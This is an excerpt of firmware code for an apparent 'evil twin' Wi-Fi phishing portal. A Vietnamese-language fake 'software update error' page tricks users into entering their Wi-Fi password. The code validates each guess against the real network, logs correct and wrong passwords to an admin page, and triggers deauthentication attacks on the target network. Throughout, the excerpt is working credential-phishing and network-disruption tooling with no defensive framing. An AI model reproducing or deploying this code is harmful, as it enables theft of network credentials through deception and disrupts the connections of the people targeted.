...
#define SUBTITLE "WIFI CẬP NHẬT"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Lỗi Phần Mềm"
#define BODY "Wifi của bạn gặp lỗi khi tự động cập nhật phần mềm mới nhất.<br><br>Để khởi động lại trình điều khiển thiết bị, vui lòng nhập mật khẩu."
...
String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>Mật khẩu Wifi:</label>" +
         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Xác-thực></form>" + footer();
}
...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    passwordLog += "SSID: " + _selectedNetwork.ssid + " - Wrong password: " + _tryPassword + "<br>";
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Sai mật khẩu</h2><p>Vui lòng thử lại.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    passwordLog += "SSID: " + _selectedNetwork.ssid + " - Correct password: " + _tryPassword + "<br>";
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;

    // Stop deauthing if the correct password is entered
...
void handleIndex() {
  ...
  if (hotspot_active == false) {
    ...
    if (webServer.hasArg("password")) {
      ...
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'> Xác thực mật khẩu, vui lòng chờ... <br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
      if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      }
    } else {
...
void handleAdmin() {
  ...
  _html += "<h2>Password Log:</h2><div>" + passwordLog + "</div>";
